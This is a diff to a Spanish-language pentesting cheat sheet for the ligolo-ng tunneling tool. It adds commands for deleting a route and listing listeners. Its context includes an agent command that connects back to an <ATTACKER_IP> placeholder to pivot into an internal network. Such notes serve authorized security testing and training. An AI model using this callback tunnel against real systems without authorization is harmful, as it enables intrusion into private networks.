@@ -21,6 +21,11 @@ ligolo-agent -connect <ATTACKER_IP>:443 -ignore-cert
 sudo ip route add 192.168.1.0/24 dev ligolo
 ```
 
+#### Eliminar una red destino en nuestras rutas
+```
+sudo ip route del 192.168.1.0/24 dev tun0
+```
+
 #### Visualizar y seleccionar las sesiones que estan establecidas
 ```
 >> session
@@ -29,6 +34,11 @@ sudo ip route add 192.168.1.0/24 dev ligolo
 #### Iniciar una sesión y en la pregunta responder con 'yes'
 ```
 >> start
+```
+
+#### Mostrar las conexiones
+```
+>> listener_list
 ```
 
 #### Crear un socket TCP de escucha el agente en puerto 1234 para redirigir las conexiones al puerto 4321 del servidor proxy
